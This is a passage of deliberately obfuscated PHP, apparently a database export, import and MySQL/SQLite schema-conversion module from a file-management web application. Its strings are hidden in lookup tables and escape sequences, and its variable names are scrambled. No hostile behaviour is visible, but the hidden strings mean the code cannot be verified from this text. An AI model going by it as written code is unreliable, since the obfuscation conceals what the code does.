($¡ÆÒ±şÜ as $‘´æêû) { $¯«………’ = basename($‘´æêû, $†ÙÁ¦· [876]); if (!in_array($¯«………’, $¸¾Ï…¼)) { continue; } $½Ô…¿“Æ->task[$†ÙÁ¦· [1167]] = $¯«………’; if ($¯«………’ == $†ÙÁ¦· [870]) { continue; } if (get_filesize($‘´æêû) == 0) { continue; } $ÖÖ±è‡× = $this->sqlToDb($‘´æêû, $½Ô…¿“Æ); if (!$ÖÖ±è‡×) { show_json(LNG($†ÙÁ¦· [1168]) . "\x5b{$¯«………’}\135", !1); } } } public function sqlFromDb($ıõŸÚşË, $’ İ÷ü, &$œ¸ÏÒ¨, $Ëì¶Ïã— = '') { if ($œ¸ÏÒ¨) { $œ¸ÏÒ¨->task[$_SERVER[¿ÈˆÑ¸ä][1167]] = $ıõŸÚşË; } $ú€Á¿çõ = $this->model($ıõŸÚşË); $¥ü¥¶¾é = 0; $’Â ºì = 0; $ÍÆ¨üûÎ = 10000; $éñˆŸ“ = fopen($’ İ÷ü, $_SERVER[¿ÈˆÑ¸ä][1169]); $ÒÒ”¯Ä = $ú€Á¿çõ->getPk(); $¦‡«ü‰Û = $ú€Á¿çõ->getDbFields(); $Ä¦Şá = $_SERVER[¿ÈˆÑ¸ä][12]; if ($GLOBALS[$_SERVER[¿ÈˆÑ¸ä][875]] && in_array($ıõŸÚşË, array($_SERVER[¿ÈˆÑ¸ä][1170], $_SERVER[¿ÈˆÑ¸ä][1171]))) { $Ä¦Şá = $ıõŸÚşË; } do { $®ôÛ½âÈ = array($ÒÒ”¯Ä => array($_SERVER[¿ÈˆÑ¸ä][1117], $’Â ºì)); $ì÷×¶Øª = $ú€Á¿çõ->where($®ôÛ½âÈ)->field($¦‡«ü‰Û)->order($ÒÒ”¯Ä . $_SERVER[¿ÈˆÑ¸ä][1172])->limit($ÍÆ¨üûÎ)->select(); $ì÷×¶Øª = !empty($ì÷×¶Øª) ? $ì÷×¶Øª : array(); if (!($àŠ÷æ—¼ = count($ì÷×¶Øª))) { break; } $”Ç¦ ©ô = end($ì÷×¶Øª); $’Â ºì = $”Ç¦ ©ô[$ÒÒ”¯Ä]; $ñˆêäÈü = array(); foreach ($ì÷×¶Øª as $ÀéıÔ–) { if ($Ä¦Şá) { if ($ıõŸÚşË == $_SERVER[¿ÈˆÑ¸ä][1170]) { if ($ÀéıÔ–[$_SERVER[¿ÈˆÑ¸ä][33]] == $_SERVER[¿ÈˆÑ¸ä][1173]) { $…‰’ší” = json_decode($ÀéıÔ–[$_SERVER[¿ÈˆÑ¸ä][451]], !0); if ($…‰’ší”[$_SERVER[¿ÈˆÑ¸ä][32]] == $GLOBALS[$_SERVER[¿ÈˆÑ¸ä][875]] && $…‰’ší”[$_SERVER[¿ÈˆÑ¸ä][833]] != 1) { continue; } } } else { if ($ÀéıÔ–[$_SERVER[¿ÈˆÑ¸ä][33]] == $_SERVER[¿ÈˆÑ¸ä][1174] && $ÀéıÔ–[$_SERVER[¿ÈˆÑ¸ä][95]] == $_SERVER[¿ÈˆÑ¸ä][871]) { continue; } } } if ($Ëì¶Ïã—) { $ÀéıÔ–[$_SERVER[¿ÈˆÑ¸ä][87]] = "\x7b\151\157\x3a{$Ëì¶Ïã—}\175" . substr($ÀéıÔ–[$_SERVER[¿ÈˆÑ¸ä][87]], strlen("\x7b\151\157\x3a{$ÀéıÔ–[$_SERVER[¿ÈˆÑ¸ä][909]]}\x7d")); $ÀéıÔ–[$_SERVER[¿ÈˆÑ¸ä][909]] = $Ëì¶Ïã—; } $ñˆêäÈü[] = $_SERVER[¿ÈˆÑ¸ä][1175] . $this->sqlEncode($ÀéıÔ–) . $_SERVER[¿ÈˆÑ¸ä][1176]; } $‹©Ñ¨ß¼ = "\111\116\x53\105\122\124\40\x49\116\124\x4f\40\140{$ıõŸÚşË}\x60\40\50\x60" . implode($_SERVER[¿ÈˆÑ¸ä][1177], $¦‡«ü‰Û) . $_SERVER[¿ÈˆÑ¸ä][1178]; fwrite($éñˆŸ“, $‹©Ñ¨ß¼ . implode($_SERVER[¿ÈˆÑ¸ä][1179], $ñˆêäÈü) . $_SERVER[¿ÈˆÑ¸ä][74] . PHP_EOL); $¥ü¥¶¾é += $àŠ÷æ—¼; if ($œ¸ÏÒ¨) { $œ¸ÏÒ¨->update($àŠ÷æ—¼); } } while ($ÍÆ¨üûÎ == $àŠ÷æ—¼); fclose($éñˆŸ“); return $¥ü¥¶¾é; } public function sqlToDb($šŠ’•ß£, &$ğ‹¢ş) { $¦Æ¾Û«ç =& $_SERVER[¿ÈˆÑ¸ä]; $ˆğŞÓ‘ö = $this->model()->db(); $§‚Äè‹„ = @fopen($šŠ’•ß£, $¦Æ¾Û«ç[1180]); if (!$§‚Äè‹„) { return !1; } $³ò«Ÿ±¡ = 0; $…ÊÆØò = $¦Æ¾Û«ç[12]; $ÎµùªØÎ = array(); $Ê Ÿ…¨  = $this->dbType(); $Œñî·ƒ = $Ê Ÿ…¨  == $¦Æ¾Û«ç[13] ? 500 : 2000; $æãÀÄË• = basename($šŠ’•ß£, $¦Æ¾Û«ç[876]); $™’ÁœÏÌ = 0; $¿ÓŞê = 4194304; while (!feof($§‚Äè‹„)) { $“ôØ¦±˜ = trim(fgets($§‚Äè‹„)); if (!$“ôØ¦±˜) { continue; } $ÍâÎˆ•½ = $this->sqlDecode($“ôØ¦±˜, $Ê Ÿ…¨ , $æãÀÄË•); if (stripos($ÍâÎˆ•½, $¦Æ¾Û«ç[431]) === 0) { if (!$…ÊÆØò) { $…ÊÆØò = $ÍâÎˆ•½ . $¦Æ¾Û«ç[53]; } continue; } if ($ğ‹¢ş) { $ğ‹¢ş->task[$¦Æ¾Û«ç[1165]] += 1; } $³ò«Ÿ±¡++; $ÎµùªØÎ[] = rtrim(rtrim(trim($ÍâÎˆ•½), $¦Æ¾Û«ç[50]), $¦Æ¾Û«ç[74]); $ÎÑµŞ = null; $Áåˆööı = strlen($ÍâÎˆ•½); $™’ÁœÏÌ += $Áåˆööı; $Òèİê¢ó = strlen($…ÊÆØò) + $™’ÁœÏÌ + (count($ÎµùªØÎ) - 1); if ($Òèİê¢ó >= $¿ÓŞê) { $ÎÑµŞ = array_pop($ÎµùªØÎ); if ($³ò«Ÿ±¡ > 1) { $³ò«Ÿ±¡--; } } if ($³ò«Ÿ±¡ >= $Œñî·ƒ || $ÎÑµŞ) { $ÍâÎˆ•½ = $…ÊÆØò . implode($¦Æ¾Û«ç[50], $ÎµùªØÎ); if (!$ˆğŞÓ‘ö->execute($ÍâÎˆ•½)) { return !1; } if ($ğ‹¢ş) { $ğ‹¢ş->update($³ò«Ÿ±¡); } $ÎµùªØÎ = array(); $³ò«Ÿ±¡ = 0; $™’ÁœÏÌ = 0; if ($ÎÑµŞ) { $ÎµùªØÎ = array($ÎÑµŞ); $³ò«Ÿ±¡ = 1; $™’ÁœÏÌ = $Áåˆööı; } } } fclose($§‚Äè‹„); if (!empty($ÎµùªØÎ)) { $ÍâÎˆ•½ = $…ÊÆØò . implode($¦Æ¾Û«ç[50], $ÎµùªØÎ); if (!$ˆğŞÓ‘ö->execute($ÍâÎˆ•½)) { return !1; } if ($ğ‹¢ş) { $ğ‹¢ş->update($³ò«Ÿ±¡); } } return !0; } public function dropTable($ˆÁªúæ = null) { $€ìŸê× =& $_SERVER[¿ÈˆÑ¸ä]; $óÆùÊ¡Û = $this->model()->db(); $ÅäÑóæ© = $ˆÁªúæ ? array($ˆÁªúæ) : $óÆùÊ¡Û->getTables(); if (!$ÅäÑóæ©) { return; } foreach ($ÅäÑóæ© as $ˆÁªúæ) { if ($ˆÁªúæ) { $ˆÁªúæ = strtolower($ˆÁªúæ); } else { continue; } $óÆùÊ¡Û->execute($€ìŸê×[1181] . $this->escapeName($ˆÁªúæ) . $€ìŸê×[1182]); } } private function sqlEncode($¨¥§öÌÙ) { $£·úãò =& $_SERVER[¿ÈˆÑ¸ä]; $ã—¬©ßŠ = array(); foreach ($¨¥§öÌÙ as $Äâ©Ïó) { if (is_array($Äâ©Ïó)) { $Äâ©Ïó = json_encode_force($Äâ©Ïó); } $Äâ©Ïó = addslashes($Äâ©Ïó); $Äâ©Ïó = str_replace(array($£·úãò[1183], $£·úãò[286], $£·úãò[418]), array($£·úãò[1184], $£·úãò[1185], $£·úãò[1186]), $Äâ©Ïó); $ã—¬©ßŠ[] = $Äâ©Ïó; } return $£·úãò[58] . implode($£·úãò[1187], $ã—¬©ßŠ) . $£·úãò[58]; } private function sqlDecode($â‰úÑ÷ş, $ŸÌÕË–, $Ê„À¦—‹ = '') { $œÏá¬ó» =& $_SERVER[¿ÈˆÑ¸ä]; $â‰úÑ÷ş = str_replace(array($œÏá¬ó»[1184], $œÏá¬ó»[1185], $œÏá¬ó»[1186]), array($œÏá¬ó»[1183], $œÏá¬ó»[286], $œÏá¬ó»[418]), $â‰úÑ÷ş); if ($ŸÌÕË– == $œÏá¬ó»[13]) { $â‰úÑ÷ş = str_ireplace($œÏá¬ó»[1188], $œÏá¬ó»[59], $â‰úÑ÷ş); $â‰úÑ÷ş = stripslashes($â‰úÑ÷ş); } return preg_replace($œÏá¬ó»[1189], $œÏá¬ó»[12], $â‰úÑ÷ş); if ($ŸÌÕË– == $œÏá¬ó»[13]) { return $Ê„À¦—‹ != $œÏá¬ó»[870] ? stripslashes($â‰úÑ÷ş) : $â‰úÑ÷ş; } if ($Ê„À¦—‹ == $œÏá¬ó»[870]) { $â‰úÑ÷ş = str_replace($œÏá¬ó»[1190], $œÏá¬ó»[119], stripslashes($â‰úÑ÷ş)); } return $â‰úÑ÷ş; } public function getSqlFile($˜áí®Çí = '') { $‘±öş­ß =& $_SERVER[¿ÈˆÑ¸ä]; $ÀŒ¡‹„Ä = $this->dbType(!0); $æşÇÂº° = CONTROLLER_DIR . "\x69\156\163\164\x61\x6c\x6c\x2f\x64\x61\x74\x61\x2f{$ÀŒ¡‹„Ä}\x2e\x73\161\154"; if (!file_exists($æşÇÂº°)) { return !1; } $çğÊ¬µ = file_get_contents($æşÇÂº°); $œÏ‰Êß½ = $‘±öş­ß[1191] . ($ÀŒ¡‹„Ä == $‘±öş­ß[887] ? $‘±öş­ß[1192] : $‘±öş­ß[1193]) . $‘±öş­ß[1194]; preg_match_all($œÏ‰Êß½, $çğÊ¬µ, $†‡¶°ƒÙ); $ÉÙäËÎ¥ = $†‡¶°ƒÙ[1]; $í¼™­ÎË = $this->model()->db(); $ÒçóØÇ = $í¼™­ÎË->getTables(); $ğ¶ÆÎÜØ = TEMP_FILES . $‘±öş­ß[1195] . date($‘±öş­ß[260]) . $‘±öş­ß[8]; del_dir($ğ¶ÆÎÜØ); mk_dir($ğ¶ÆÎÜØ); $ğòşÉÜµ = $ğ¶ÆÎÜØ . $‘±öş­ß[1196]; $à½‹ÚÓ = $ğ¶ÆÎÜØ . $‘±öş­ß[1197]; $µìç”Òü = $ÀŒ¡‹„Ä == $‘±öş­ß[13] ? $‘±öş­ß[887] : $‘±öş­ß[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\x61\154\x6c\57\144\x61\164\x61\x2f{$µìç”Òü}\56\163\161\x6c", $ğ¶ÆÎÜØ); @touch($ğ¶ÆÎÜØ . $ÀŒ¡‹„Ä . $‘±öş­ß[876]); $ö–µŞÖÕ = fopen($ğòşÉÜµ, $‘±öş­ß[1169]); $öŞ×¶„Ï = fopen($à½‹ÚÓ, $‘±öş­ß[1169]); if ($ÀŒ¡‹„Ä == $‘±öş­ß[13]) { $ÒçóØÇ = array_diff($ÒçóØÇ, array($‘±öş­ß[868], $‘±öş­ß[869])); $ÖÎ÷£“ = array($‘±öş­ß[1198], $‘±öş­ß[1199], $‘±öş­ß[1200]); fwrite($öŞ×¶„Ï, implode(PHP_EOL, $ÖÎ÷£“) . PHP_EOL . PHP_EOL); foreach ($ÒçóØÇ as $ù»’Ü˜ğ) { $ËÖË¯Îù = $this->sqlFromSqlite($ù»’Ü˜ğ); if (!$ËÖË¯Îù[$‘±öş­ß[13]]) { continue; } fwrite($öŞ×¶„Ï, $ËÖË¯Îù[$‘±öş­ß[13]] . PHP_EOL . PHP_EOL); if (!in_array($ù»’Ü˜ğ, $ÉÙäËÎ¥)) { fwrite($ö–µŞÖÕ, $ËÖË¯Îù[$‘±öş­ß[887]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÒçóØÇ as $ù»’Ü˜ğ) { $ËÖË¯Îù = $this->sqlFromMysql($ù»’Ü˜ğ); if (!$ËÖË¯Îù[$‘±öş­ß[887]]) { continue; } fwrite($ö–µŞÖÕ, $ËÖË¯Îù[$‘±öş­ß[887]] . PHP_EOL . PHP_EOL); if (!in_array($ù»’Ü˜ğ, $ÉÙäËÎ¥)) { fwrite($öŞ×¶„Ï, $ËÖË¯Îù[$‘±öş­ß[13]] . PHP_EOL . PHP_EOL); } } } fclose($ö–µŞÖÕ); fclose($öŞ×¶„Ï); $çğÊ¬µ = array($‘±öş­ß[887] => $ğòşÉÜµ, $‘±öş­ß[13] => $à½‹ÚÓ); return $˜áí®Çí ? $çğÊ¬µ[$˜áí®Çí] : $çğÊ¬µ; } public function dbType($¤‘ï¨«¤ = false) { $®¥¦Î =& $_SERVER[¿ÈˆÑ¸ä]; $øµî±ô­ = $¤‘ï¨«¤ ? $GLOBALS[$®¥¦Î[6]][$®¥¦Î[21]] : $this->database; $øµî±ô­ = array_change_key_case($øµî±ô­); $—ÒüÄ‡ñ = $øµî±ô­[$®¥¦Î[1070]]; if ($—ÒüÄ‡ñ == $®¥¦Î[1067]) { $ÙÑ—«»Â = explode($®¥¦Î[4], $øµî±ô­[$®¥¦Î[1076]]); $—ÒüÄ‡ñ = $ÙÑ—«»Â[0]; } $Ø¾›»›· = array($®¥¦Î[1201] => $®¥¦Î[13], $®¥¦Î[1015] => $®¥¦Î[887]); if (isset($Ø¾›»›·[$—ÒüÄ‡ñ])) { $—ÒüÄ‡ñ = $Ø¾›»›·[$—ÒüÄ‡ñ]; } return $—ÒüÄ‡ñ; } public function sqlFromMysql($Ü×Á¤Ø, $…Í¥—Ä’ = '') { $¦„ŠºÖ =& $_SERVER[¿ÈˆÑ¸ä]; $ÔşùâÆè = array($¦„ŠºÖ[887] => $¦„ŠºÖ[12], $¦„ŠºÖ[13] => $¦„ŠºÖ[12]); $Õƒ‰ÓéÖ = $this->escapeName($Ü×Á¤Ø); $¸çÀ÷‹³ = $this->escapeName($Ü×Á¤Ø, $¦„ŠºÖ[13]); $œÁ–îıŞ = $this->model()->db(); $Ç´ó˜… = $œÁ–îıŞ->query("\x73\150\x6f\167\40\x63\x72\145\141\164\145\40\164\141\142\154\145\40{$Õƒ‰ÓéÖ}\73"); if (!$Ç´ó˜… || !$Ç´ó˜…[0]) { return !1; } $ßÍ‚ İê = _get($Ç´ó˜…[0], $¦„ŠºÖ[1202], $¦„ŠºÖ[12]); if (!$ßÍ‚ İê) { return !1; } $§Ç¥Î˜ = "\104\122\x4f\120\40\x54\x41\102\114\105\40\111\106\40\105\130\x49\x53\x54\x53\40{$Õƒ‰ÓéÖ}\x3b" . PHP_EOL . $ßÍ‚ İê . $¦„ŠºÖ[74]; if ($…Í¥—Ä’ == $¦„ŠºÖ[887]) { return $§Ç¥Î˜; } $ÔşùâÆè[$¦„ŠºÖ[887]] = $§Ç¥Î˜; $‘Ñ²„Íï = array_change_key_case($GLOBALS[$¦„ŠºÖ[6]][$¦„ŠºÖ[21]]); $·Š»É = $‘Ñ²„Íï[$¦„ŠºÖ[1075]]; $éÁ£şÇ = $¦„ŠºÖ[1203] . $·Š»É . "\x27\40\x41\x4e\104\40\x54\x41\102\x4c\x45\137\x4e\x41\x4d\x45\40\75\40{$¸çÀ÷‹³}\x3b"; $”Ø‚âÀ” = "\x53\x48\x4f\x57\40\x49\x4e\104\x45\130\x20\x46\x52\117\115\x20{$Õƒ‰ÓéÖ}\73"; $æÅ¤¹…¤ = $œÁ–îıŞ->query($éÁ£şÇ); if (empty($æÅ¤¹…¤)) { return $…Í¥—Ä’ ? $ÔşùâÆè[$…Í¥—Ä’] : $ÔşùâÆè; } $€…‹–é‚ = $œÁ–îıŞ->query($”Ø‚âÀ”); $İòíìï¥ = $¦„ŠºÖ[12]; $«ÎØğ· = array(); foreach ($€…‹–é‚ as $­èá¹Øó) { if (!$İòíìï¥ && $­èá¹Øó[$¦„ŠºÖ[1204]] == $¦„ŠºÖ[1205]) { $İòíìï¥ = $­èá¹Øó[$¦„ŠºÖ[1206]]; } if (isset($«ÎØğ·[$­èá¹Øó[$¦„ŠºÖ[1204]]])) { $«ÎØğ·[$­èá¹Øó[$¦„ŠºÖ[1204]]][$¦„ŠºÖ[1207]][] = $­èá¹Øó[$¦„ŠºÖ[1206]]; continue; } $«ÎØğ·[$­èá¹Øó[$¦„ŠºÖ[1204]]] = array($¦„ŠºÖ[1208] => $­èá¹Øó[$¦„ŠºÖ[1204]], $¦„ŠºÖ[1207] => array($­èá¹Øó[$¦„ŠºÖ[1206]]), $¦„ŠºÖ[1209] => $­èá¹Øó[$¦„ŠºÖ[1210]] == $¦„ŠºÖ[91] ? 0 : 1); } $“ãŸæúæ = array(); foreach ($«ÎØğ· as $­èá¹Øó) { $§Ù‰²êä = $­èá¹Øó[$¦„ŠºÖ[1208]] == $¦„ŠºÖ[1205]; $©ôïşªû = $­èá¹Øó[$¦„ŠºÖ[1209]] == $¦„ŠºÖ[91] && !$§Ù‰²êä ? $¦„ŠºÖ[1211] : $¦„ŠºÖ[12]; $ÉëğŒĞ³ = $¦„ŠºÖ[1212] . $Ü×Á¤Ø . $¦„ŠºÖ[11] . ($§Ù‰²êä ? $¦„ŠºÖ[1213] : $­èá¹Øó[$¦„ŠºÖ[1208]]); $ÜÂààÊ¥ = $¦„ŠºÖ[1214] . implode($¦„ŠºÖ[1215], $­èá¹Øó[$¦„ŠºÖ[1207]]) . $¦„ŠºÖ[1216]; $“ãŸæúæ[] = sprintf($¦„ŠºÖ[1217], $¦„ŠºÖ[1218], $©ôïşªû, $¦„ŠºÖ[1219], $ÉëğŒĞ³, $¦„ŠºÖ[1220], $Ü×Á¤Ø, $ÜÂààÊ¥); } $¢ÔÑ»Ò = array(); $ïùÍ‘û = array($¦„ŠºÖ[1221] => $¦„ŠºÖ[391], $¦„ŠºÖ[1222] => $¦„ŠºÖ[391], $¦„ŠºÖ[365] => $¦„ŠºÖ[391], $¦„ŠºÖ[364] => $¦„ŠºÖ[391], $¦„ŠºÖ[1223] => $¦„ŠºÖ[1224], $¦„ŠºÖ[1225] => $¦„ŠºÖ[1224], $¦„ŠºÖ[1224] => $¦„ŠºÖ[1224], $¦„ŠºÖ[1226] => $¦„ŠºÖ[1224], $¦„ŠºÖ[283] => $¦„ŠºÖ[1224], $¦„ŠºÖ[1227] => $¦„ŠºÖ[1224], $¦„ŠºÖ[1228] => $¦„ŠºÖ[1224], $¦„ŠºÖ[1229] => $¦„ŠºÖ[1230], $¦„ŠºÖ[366] => $¦„ŠºÖ[1230], $¦„ŠºÖ[367] => $¦„ŠºÖ[1230], $¦„ŠºÖ[1231] => $¦„ŠºÖ[1231]); foreach ($æÅ¤¹…¤ as $­èá¹Øó) { $…Í¥—Ä’ = _get($ïùÍ‘û, $­èá¹Øó[$¦„ŠºÖ[1232]], $­èá¹Øó[$¦„ŠºÖ[1233]]); $—ã„Ëı = $­èá¹Øó[$¦„ŠºÖ[1234]] == $¦„ŠºÖ[998] ? $¦„ŠºÖ[1235] : $¦„ŠºÖ[1236]; $ç…¼´¡ = $­èá¹Øó[$¦„ŠºÖ[1237]] == $İòíìï¥ ? $¦„ŠºÖ[1238] : $¦„ŠºÖ[12]; $®‰¨Ü¼‰ = $­èá¹Øó[$¦„ŠºÖ[1052]] ? strtoupper(str_replace($¦„ŠºÖ[11], $¦„ŠºÖ[12], $­èá¹Øó[$¦„ŠºÖ[1052]])) : $¦„ŠºÖ[12]; $¢ÔÑ»Ò[] = sprintf($¦„ŠºÖ[1239], $­èá¹Øó[$¦„ŠºÖ[1237]], $…Í¥—Ä’, $—ã„Ëı, $ç…¼´¡, $®‰¨Ü¼‰); } $öŒ±©ÁÍ = array("\104\x52\x4f\x50\x20\124\x41\102\x4c\x45\x20\111\x46\40\105\130\x49\x53\124\123\x20{$¸çÀ÷‹³}\x3b", "\103\122\105\101\x54\x45\x20\124\101\102\114\105\40{$¸çÀ÷‹³}\40\x28", implode($¦„ŠºÖ[50] . PHP_EOL, $¢ÔÑ»Ò), $¦„ŠºÖ[1240]); $¦¨šœç = implode(PHP_EOL, array_merge($öŒ±©ÁÍ, $“ãŸæúæ)); if ($…Í¥—Ä’ == $¦„ŠºÖ[13]) { return $¦¨šœç; } $ÔşùâÆè[$¦„ŠºÖ[13]] = $¦¨šœç; return $ÔşùâÆè; } public function sqlFromSqlite($ñäç›‚, $å¬Åšúü = '') { $ÙÎ”•Œø =& $_SERVER[¿ÈˆÑ¸ä]; $ªŞìïœ = array($ÙÎ”•Œø[887] => $ÙÎ”•Œø[12], $ÙÎ”•Œø[13] => $ÙÎ”•Œø[12]); $–îñŞÍ¬ = $this->escapeName($ñäç›‚); $ƒ´¬ÅÂÙ = $this->escapeName($ñäç›‚, $ÙÎ”•Œø[13]); $Ş™‚§È‰ = $this->model()->db(); $òıüºµÁ = "\120\x52\101\107\x4d\x41\x20\x54\x41\102\x4c\x45\x5f\x49\116\x46\x4f\x20\x28\x27{$ñäç›‚}\x27\x29"; $ûô‰éæµ = "\x53\105\114\x45\103\x54\x20\52\x20\106\x52\x4f\115\x20\163\x71\154\151\x74\145\137\155\x61\163\164\x65\162\x20\x57\x48\105\122\x45\40\x74\142\154\x5f\156\141\155\145\40\x3d\x20\47{$ñäç›‚}\47"; $€ûšœÅ½ = $Ş™‚§È‰->query($òıüºµÁ); if (empty($€ûšœÅ½)) { return $å¬Åšúü ? $ªŞìïœ[$å¬Åšúü] : $ªŞìïœ; } $œŠ·¦ºÀ = $Ş™‚§È‰->query($ûô‰éæµ); $åØ‘ıÆ‹ = $ß£ƒ„é™ = array(); foreach ($œŠ·¦ºÀ as $Áªæ İë) { if ($Áªæ İë[$ÙÎ”•Œø[33]] == $ÙÎ”•Œø[358]) { $åØ‘ıÆ‹[] = $Áªæ İë[$ÙÎ”•Œø[1241]]; } else { $ß£ƒ„é™[] = $Áªæ İë[$ÙÎ”•Œø[1241]]; } } $ù¶™úà¤ = array_merge(array("\104\x52\x4f\120\x20\x54\101\x42\114\105\40\111\x46\x20\105\130\x49\123\124\123\x20{$ƒ´¬ÅÂÙ}\73"), $åØ‘ıÆ‹, $ß£ƒ„é™); $ù¶™úà¤ = implode($ÙÎ”•Œø[74] . PHP_EOL, $ù¶™úà¤) . $ÙÎ”•Œø[74]; if ($å¬Åšúü == $ÙÎ”•Œø[13]) { return $ù¶™úà¤; } $ªŞìïœ[$ÙÎ”•Œø[13]] = $ù¶™úà¤; $ÃÎ¢‹å¸ = $™Š¥‡Ü¹ = array(); $ÏŠŞ¡ = array(); $é–‡©È = array(); foreach ($œŠ·¦ºÀ as $Áªæ İë) { if ($Áªæ İë[$ÙÎ”•Œø[33]] == $ÙÎ”•Œø[1242]) { $æäÜ¦ = $Áªæ İë[$ÙÎ”•Œø[1241]]; $´¶Šî® = stripos($æäÜ¦, $ÙÎ”•Œø[1211]) !== !1; $´ï‹Ç×° = stripos($æäÜ¦, $ÙÎ”•Œø[1205]) !== !1; preg_match($ÙÎ”•Œø[1243], $æäÜ¦, $œç™²‰); if (empty($œç™²‰)) { continue; } $€†Öù® = array_map($ÙÎ”•Œø[1244], explode($ÙÎ”•Œø[50], $œç™²‰[1])); $ƒ¨ªëš = array(); foreach ($€†Öù® as $Ö¨üıï…) { $¸É¨´È = trim($Ö¨üıï…, $ÙÎ”•Œø[1245]); $ƒ¨ªëš[] = $¸É¨´È; $ÏŠŞ¡[$¸É¨´È] = !0; } $é–‡©È[] = array($ÙÎ”•Œø[32] => $Áªæ İë[$ÙÎ”•Œø[32]], $ÙÎ”•Œø[1241] => $æäÜ¦, $ÙÎ”•Œø[1246] => $´¶Šî®, $ÙÎ”•Œø[1247] => $´ï‹Ç×°, $ÙÎ”•Œø[1248] => $ƒ¨ªëš); } } $´ô©–¿— = array($ÙÎ”•Œø[1222] => $ÙÎ”•Œø[1222], $ÙÎ”•Œø[391] => $ÙÎ”•Œø[1249], $ÙÎ”•Œø[1230] => $ÙÎ”•Œø[1250], $ÙÎ”•Œø[1224] => $ÙÎ”•Œø[1224], $ÙÎ”•Œø[1231] => $ÙÎ”•Œø[1251], $ÙÎ”•Œø[1252] => $ÙÎ”•Œø[1253]); $áºÙ = array($ÙÎ”•Œø[451], $ÙÎ”•Œø[169], $ÙÎ”•Œø[536]); $£¥Ãœ = array($ÙÎ”•Œø[391], $ÙÎ”•Œø[1230], $ÙÎ”•Œø[1252], $ÙÎ”•Œø[1222]); foreach ($€ûšœÅ½ as $Áªæ İë) { $©ÕŞÄ· = $Áªæ İë[$ÙÎ”•Œø[32]]; $©»¶¶½… = strtolower($Áªæ İë[$ÙÎ”•Œø[33]]); if ($©»¶¶½… == $ÙÎ”•Œø[1224] && isset($ÏŠŞ¡[$©ÕŞÄ·])) { $å¬Åšúü = in_array($©ÕŞÄ·, $áºÙ) ? $ÙÎ”•Œø[1224] : $ÙÎ”•Œø[1254]; } else { $å¬Åšúü = _get($´ô©–¿—, $©»¶¶½…, $©»¶¶½…); } if ($Áªæ İë[$ÙÎ”•Œø[57]] > 0) { $™Š¥‡Ü¹[$Áªæ İë[$ÙÎ”•Œø[57]]] = $©ÕŞÄ·; } $§Êı–ùË = $ÙÎ”•Œø[12]; if ($Áªæ İë[$ÙÎ”•Œø[56]] !== null) { $•Èƒ£â© = $Áªæ İë[$ÙÎ”•Œø[56]]; if (in_array($©»¶¶½…, $£¥Ãœ) && is_numeric($•Èƒ£â©)) { $§Êı–ùË = "\x44\x45\x46\101\x55\114\x54\x20{$•Èƒ£â©}"; } else { if (strtolower($•Èƒ£â©) === $ÙÎ”•Œø[104]) { $§Êı–ùË = $Áªæ İë[$ÙÎ”•Œø[35]] ? $ÙÎ”•Œø[12] : $ÙÎ”•Œø[1236]; } else { $Š°×–åœ = is_numeric($•Èƒ£â©) ? $•Èƒ£â© : $ÙÎ”•Œø[58] . addslashes($•Èƒ£â©) . $ÙÎ”•Œø[58]; $§Êı–ùË = "\104\105\106\101\x55\114\x54\40{$Š°×–åœ}"; } } } $•àâ×õ = $Áªæ İë[$ÙÎ”•Œø[35]] ? $ÙÎ”•Œø[1235] : $ÙÎ”•Œø[1255]; $ªãÜÔ™Ù = stripos($©»¶¶½…, $ÙÎ”•Œø[365]) !== !1 && $Áªæ İë[$ÙÎ”•Œø[57]] ? $ÙÎ”•Œø[1256] : $ÙÎ”•Œø[12]; $ÃÎ¢‹å¸[] = sprintf($ÙÎ”•Œø[1257], $©ÕŞÄ·, $å¬Åšúü, $•àâ×õ, $§Êı–ùË, $ªãÜÔ™Ù); } if (!empty($™Š¥‡Ü¹)) { ksort($™Š¥‡Ü¹); $‡”Ğóº„ = $ÙÎ”•Œø[472] . implode($ÙÎ”•Œø[1177], $™Š¥‡Ü¹) . $ÙÎ”•Œø[472]; $ÃÎ¢‹å¸[] = "\x50\x52\111\115\101\122\x59\x20\x4b\105\131\x20\x28{$‡”Ğóº„}\51"; } foreach ($é–‡©È as $‰ˆò–ã¬) { if ($‰ˆò–ã¬[$ÙÎ”•Œø[1247]]) { continue; } $ê™æıõ¹ = array(); foreach ($‰ˆò–ã¬[$ÙÎ”•Œø[1248]] as $Ö¨üıï…) { $´ô©–¿— = null; foreach ($€ûšœÅ½ as $µ¤º‚Óå) { if ($µ¤º‚Óå[$ÙÎ”•Œø[32]] == $Ö¨üıï…) { $´ô©–¿— = strtolower($µ¤º‚Óå[$ÙÎ”•Œø[33]]); break; } } if ($´ô©–¿— == $ÙÎ”•Œø[1224] && in_array($Ö¨üıï…, $áºÙ)) { $ê™æıõ¹[] = "\140{$Ö¨üıï…}\140\50\62\x35\60\x29"; } else { $ê™æıõ¹[] = "\140{$Ö¨üıï…}\x60"; } } $©»¶¶½… = ($‰ˆò–ã¬[$ÙÎ”•Œø[1246]] ? $ÙÎ”•Œø[1258] : $ÙÎ”•Œø[12]) . $ÙÎ”•Œø[1259]; $‹€‡Ó÷½ = str_replace($ÙÎ”•Œø[1212] . $ñäç›‚ . $ÙÎ”•Œø[11], $ÙÎ”•Œø[12], $‰ˆò–ã¬[$ÙÎ”•Œø[32]]); $‹€‡Ó÷½ = str_replace($ñäç›‚ . $ÙÎ”•Œø[11], $ÙÎ”•Œø[12], $‹€‡Ó÷½); $ÃÎ¢‹å¸[] = "{$©»¶¶½…}\40\140{$‹€‡Ó÷½}\140\40\x28" . implode($ÙÎ”•Œø[50], $ê™æıõ¹) . $ÙÎ”•Œø[1176]; } $Ò³¿ÇÌò = array("\104\122\x4f\120\40\x54\101\x42\x4c\x45\x20\111\106\40\105\x58\111\123\124\x53\40{$–îñŞÍ¬}\73", "\103\122\105\x41\x54\x45\40\124\101\102\x4c\x45\40{$–îñŞÍ¬}\40\50", implode($ÙÎ”•Œø[50] . PHP_EOL, $ÃÎ¢‹å¸), $ÙÎ”•Œø[1260]); $Ò³¿ÇÌò = implode(PHP_EOL, $Ò³¿ÇÌò); if ($å¬Åšúü == $ÙÎ”•Œø[887]) { return $Ò³¿ÇÌò; } $ªŞìïœ[$ÙÎ”•Œø[887]] = $Ò³¿ÇÌò; return $ªŞìïœ; } private function escapeName($¹ôêàü±, $®±ÜÂ = "\x6d\x79\163\x71\x6c") { $êåé©€É =& $_SERVER[¿ÈˆÑ¸ä]; $¹ôêàü± = preg_replace($êåé©€É[1261], 